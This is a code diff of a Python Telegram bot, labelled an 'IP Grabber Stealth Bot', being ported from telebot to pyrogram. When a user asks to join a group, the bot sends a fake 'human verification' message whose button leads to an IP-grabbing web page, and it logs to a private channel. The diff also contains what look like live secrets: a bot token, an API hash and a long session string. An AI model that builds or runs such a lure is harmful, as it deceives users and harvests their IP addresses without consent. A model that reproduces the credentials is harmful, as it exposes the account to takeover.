@@ -1,45 +1,42 @@
-import telebot
-from telebot import types
+import asyncio
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 import os
+import requests
+from datetime import datetime
 
-# === YOUR DATA (UPDATED) ===
-BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
+# === YOUR DATA ===
+API_ID = 32696327
+API_HASH = "7748fec8a76bc4ed65006d13accd7555"
+SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATGI_faDP87KwAzE6TBOEeGbPdKm8VJtzVY2y9vW9xYt2YUMtCiRrnV2DAF56tUOvAM6WVPRh9j0Pq7YNbHsnGU8lrV6tO-eH5mwrZzdC3tiVsxm9KaxRd7KRkSRSoyWLxv0WuMDU2-vA4AzNyZMDK0F3V62guodW6XuBa2WvVK0fzgLTK14PG_ZOAWmrsn5Nz77t1-OYYVd4Wbc0fFqZTDr5g_OsJZeYimCLXY2tl3VlcXO-k8IYJ93sbDD5ZquBZDMeOJ8sZYSvoypHfhfFDdTWt-3wEB6upwAAAAB01CSBAA"
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
-LOG_CHANNEL = "-1002290475903"
+LOG_CHANNEL = -1002290475903
 
-print("🤖 Bot starting...")
-print("✅ BOT_TOKEN loaded successfully")
-print(f"WEB_URL: {WEB_URL}")
-print(f"LOG_CHANNEL: {LOG_CHANNEL}")
+app = Client("ip_grabber_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
 
-bot = telebot.TeleBot(BOT_TOKEN)
-
-@bot.chat_join_request_handler()
-def handle_join_request(request: types.ChatJoinRequest):
+@app.on_chat_join_request()
+async def handle_join_request(client, request):
     user_id = request.user_chat_id
     chat_id = request.chat.id
     first_name = request.from_user.first_name or "User"
 
     link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"
 
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔐 Verify Account & Join Group", url=link))
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔐 Verify Account & Join Group", url=link)]
+    ])
 
     try:
-        bot.send_message(
+        await client.send_message(
             user_id,
             "✅ Human verification successful!\n\n"
             "Click the button below for **final verification** and to join the group:\n\n"
             "Link will expire in 10 minutes.",
-            reply_markup=markup
+            reply_markup=keyboard
         )
-        print(f"✅ Verification link sent to user {user_id}")
+        print(f"✅ Verification link sent to {user_id}")
     except Exception as e:
         print(f"❌ Failed to send message to {user_id}: {e}")
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "✅ IP Grabber Stealth Bot is active!")
-
-print("✅ IP Grabber Stealth Bot is running...")
-bot.infinity_polling(drop_pending_updates=True)
+print("✅ IP Grabber Stealth Bot with Sangmata features is running...")
+app.run()
